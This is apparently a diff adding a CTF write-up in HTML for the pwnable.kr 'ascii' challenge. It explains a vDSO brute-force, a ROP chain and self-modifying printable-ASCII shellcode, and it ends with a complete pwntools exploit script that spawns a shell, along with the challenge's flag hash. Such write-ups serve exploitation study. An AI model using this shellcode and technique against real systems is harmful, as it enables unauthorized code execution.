@@ -1,0 +1,149 @@
+<!--Solve date: 07/12/2020-->
+
+<h1>pwnable.kr - ascii</h1>
+
+<h2>Grotesque - 333 pts</h2>
+
+<h3>Writeup by YR81</h3>
+
+<h4>Discussion</h4>
+
+<p>This challenge is similar to <code>ascii_easy</code> that we have previously looked at. The main difference is here, nothing convenient is mapped for us at a printable address. Instead, we have an anonymous page of memory mapped at <code>0x80000000</code>. This page is readable, writable, and even executable. We get to input up to 400 characters, which are checked against the "ASCII" armor. The procedure shown in <b>Figure 1</b> below will return <code>0</code> if the byte is outside the printable ASCII range, and <code>1</code> if the byte is inside the range.</p>
+
+<img src = "./images/pwnable_ascii_1.png"/>
+
+<p class = "caption">Figure 1. ASCII armor.</p>
+
+<p>Interestingly enough, <code>0x7f</code> (DEL) is actually considered valid ASCII, although we will not use it in our exploit. After the characters are read, the vulnerable function is called, just as in <code>ascii_easy</code>, and the function returns. The vulnerable function here simply performs a <code>strcpy()</code> from the mapped page to a local buffer.</p>
+
+<p>Our task here is a bit more challenging because even though we are relatively confident that we will need to write shellcode, we don't have a way to actually return to our shellcode. The library is statically-linked to addresses that are overall not printable, and there is nothing really mapped to a printable address.</p>
+
+<p>One idea is to modify the lower word of the return address to try to fuzz a return to our buffer area. I did not really feel like looking around the binary for those perfect gadgets, so I chose to follow a different <i>bruteforce-y</i> approach that exploits a well-known problem with the Linux kernel to return to a particular gadget in vDSO. The <a href = "https://man7.org/linux/man-pages/man7/vdso.7.html" target = "_blank">vDSO</a> is a small special shared library that is automatically loaded into user-space programs. Its main purpose is to optimize the performance of certain system calls that would otherwise have to go through costly context changes. By default, <code>vDSO</code> is relatively close to the stack region, as shown in <b>Figure 2</b>. However, when removing the limit on stack memory resources, we can force it to be at a printable address. This is true even with ASLR enabled. In older versions of the kernel, before <a href = "https://nvd.nist.gov/vuln/detail/CVE-2016-3672" target = "_blank">CVE-2016-3672</a>, the address of vDSO and other mappings could be predicted with certainty. At present, this we cannot know exactly where <code>vDSO</code> will be mapped, but the possibilities are quite limited. It is possible to bruteforce, as there are only about 256 possible values for the <code>vDSO</code> base address.</p>
+
+<img src = "./images/pwnable_ascii_2.png"/>
+
+<p class = "caption">Figure 2. Memory mapping, limited stack resources (8192 kB).
+<code>vDSO</code> is located below the stack at <code>0xf775f000</code>.</p>
+
+<img src = "./images/pwnable_ascii_3.png"/>
+
+<p class = "caption">Figure 3. Memory mapping, unlimited stack resources.
+<code>vDSO</code> is now located at <code>0x55625000</code>.</p>
+
+<p>We can set stack resource to unlimited very simply: <code>set ulimit -s unlimited</code>. To confirm the effects of the action, use <code>ulimit -a</code>. Now that <code>vDSO</code> is in a desirable position, we can narrow down our return address. Dumping the memory to a file and using the <code>ROPgadget</code> tool, we find a <code>pop _; pop _; ret</code> gadget at file offset <code>0xb5a</code>, and, by extension, a <code>pop _; ret</code> gadget at <code>0xb5b</code>. (Note that the last byte of the offset must be printable.) This is good because we know that the address of the mapped region is in <code>main()</code>'s stack frame. In particular, it is at <code>esp + 0x28</code>. The return address from <code>vuln()</code> will be at <code>esp - 4</code> (relative to <code>main()</code>'s frame.) The offset is <code> 0x2c = 44</code>. To move the stack pointer to point to <code>0x80000000</code>, then, we must somehow get rid of 11 dwords on the stack. We can verify that the following simple ROP gadget will do the trick.</p>
+
+<img src = "./images/pwnable_ascii_4.png"/>
+
+<p class = "caption">Figure 4. ROP chain that will return to the input buffer. As usual, blue background represents a return address, pointing to code, while the gold background represents "data" that will be manipulated by the gadgets. Yellow text represents stack memory that we overwrite, while white text is known to exist on the stack already.</p>
+
+<p>With the ROP gadget set up, we can now write shellcode that will be run when we jump to our buffer. Sadly, the shellcode must still be ASCII, which is very annoying! A very useful reference is <a href = "http://sparksandflames.com/files/x86InstructionChart.html" target = "_blank">this x86 opcode map</a>, which gives a visual reference for the instructions we have access to. Obviously, since we are only allowed ASCII, we are confined to the fourth through eighth rows of this table. This turns out to be enough.</p>
+
+<p>We construct a self-modifying code of sorts. We will <i>generate</i> the actual shellcode using an "ASCII-compliant" :) meta-shellcode, then jump to the actual shellcode from the meta-shellcode after the actual shellcode is fully formed. First, we specify where we will drop the shellcode. This is arbitrary, but should obviously not overlap with the meta-shellcode. I chose to put it at <code>0x800000e0</code>.</p>
+
+<p>To form that address, which clearly no part is ASCII, we begin by initializing a register with <code>-1 = 0xffffffff</code>. This will prove immensely useful for generating values greater than <code>0x7f</code>. The following does this:</p>
+
+<pre class = "x86asm">
+push 0x30
+pop eax
+xor al, 0x30
+push eax
+pop edx
+dec edx
+</pre>
+
+<p>Simply, <code>eax</code> is cleared by setting its value to <code>0x30</code>, then <code>XOR</code>ing it with the same value. This is moved to <code>edx</code> through a stack push-pop, and then decremented to give us the desired constant. In the remaining part of the meta-shellcode, <code>edx</code> will never be written to.</p>
+
+<p>Here, the address is formed:</p>
+
+<pre class = "x86asm">
+; set up code origin
+xor eax, 0x30303030
+xor eax, 0x4f30302f
+push eax
+push esp
+pop ecx
+xor [ecx], dh
+inc ecx
+inc ecx
+inc ecx
+xor [ecx], dh
+</pre>
+
+<p>What the heck is going on here? Note that <code>eax</code> is 0 at the beginning of this segment, so by the time we get to the third instruction, <code>eax = 0x7f00001f</code>. We need to invert the first and fourth bytes, which we do by <code>XOR</code>ing them with <code>dh</code>, which, like all of the other bytes in <code>edx</code>, is <code>0xff</code>. This inverts the bits to get the desired address <code>0x800000e0</code>. Note that this address remains on the stack for future use.</p>
+
+<p>Now, we begin to construct the <a href = "http://shell-storm.org/shellcode/files/shellcode-811.php" target = "_blank"> shellcode</a>, one dword at a time. Below is the first four bytes:</p>
+
+<pre class = "x86asm">
+push 0x68503f31
+push esp
+pop ecx
+inc ecx
+xor [ecx], dh
+pop ebp
+pop eax
+xor ebp, [eax]
+xor [eax], ebp
+inc eax
+inc eax
+inc eax
+inc eax
+push eax
+</pre>
+
+<p>Here, we fist move the constant <code>0x68503f31</code> into <code>eax</code>. We then doctor the value by flipping the bits of the second byte, making it <code>0xc0</code>. The value is popped into <code>ebp</code>, and the previously-saved address is popped into <code>eax</code>. Next I've used the <code>XOR</code> swap trick to essentially move the code into the address. The pointer is incremented four times and pushed back to the stack for future use. The rest of the code is similarly loaded, with optimizations provided by <i>starting out</i> with all inverted bits, such as in the fifth block:</p>
+
+<pre class = "x86asm">
+push edx
+pop eax
+xor eax, 0x4f3d763e
+push eax
+pop ebp
+pop eax
+xor ebp, [eax]
+xor [eax], ebp
+inc eax
+inc eax
+inc eax
+inc eax
+push eax
+</pre>
+
+<p>Note that by starting <code>eax = edx = 0xffffffff</code>, only one <code>XOR</code> operation is needed to get the correct bytes into <code>eax</code> and then into the shellcode memory.</p>
+
+<p>After the last bytes have been loaded, we execute a <code>jnz 0x800000e0</code>, which of course is assembled as a short, relative jump to the offset of the completed shellcode relative to <code>0x80000000</code> plus the length of the meta-shellcode.</p>
+
+<h4>Payload</h4>
+
+<pre class = "python">
+
+from pwn import *
+import random
+
+while True:
+    p = process("~/ascii", shell = True)
+    
+    #randomly pick an address for VDSO. ensure ulimit -s unlimited
+    vdso = 0
+    while (vdso >> 12) & 0xf in [0, 1, 8, 9, 0xa, 0xb, 0xc, 0xd, 0xe, 0xf]:
+        vdso = 0x55000000 + (random.randint(0x558, 0x657) << 12)
+    
+    log.info("VDSO guess: %s" % (hex(vdso)))
+    
+    sc = b"\x6a\x30\x58\x34\x30\x50\x5a\x4a\x35\x30\x30\x30\x30\x35\x2f\x30\x30\x4f\x50\x54\x59\x30\x31\x41\x41\x41\x30\x31\x68\x31\x3f\x50\x68\x54\x59\x41\x30\x31\x5d\x58\x33\x28\x31\x28\x40\x40\x40\x40\x50\x68\x2f\x2f\x73\x68\x5d\x58\x33\x28\x31\x28\x40\x40\x40\x40\x50\x68\x68\x2f\x62\x69\x5d\x58\x33\x28\x31\x28\x40\x40\x40\x40\x50\x52\x58\x35\x30\x30\x30\x30\x35\x5e\x46\x2c\x46\x50\x54\x59\x30\x31\x5d\x58\x33\x28\x31\x28\x40\x40\x40\x40\x50\x52\x58\x35\x3e\x76\x3d\x4f\x50\x5d\x58\x33\x28\x31\x28\x40\x40\x40\x40\x50\x68\x30\x40\x30\x30\x58\x35\x3b\x72\x4f\x30\x50\x54\x59\x41\x30\x31\x41\x30\x31\x5d\x58\x33\x28\x31\x28\x75\x44"	#execve(...) better
+    sc += (0xa8 - len(sc)) * b'd' + b"6666"		#add padding, no ebp
+    p.send(sc + 3 * (p32(vdso + 0xb5a) + b"ddddcccc") + p32(vdso + 0xb5b) + b"ccc\n")
+    p.recvline()		#"triggering bug..."
+    r = p.recvline(timeout = 3)
+    if r not in [b"Bus error (core dumped)\n", b"Segmentation fault (core dumped)\n"]:
+        break
+    
+    p.close()
+
+log.info("Hopefully you have a shell! :)")
+p.interactive()
+log.info("Left loop")
+</pre>
+
+<h4>Flag (SHA-256)</h4>
+
+<p><code>e344d1da76f110b8dd76834c75036be06e2678d76f5ca6b32d371eff95c7cf67</code></p>
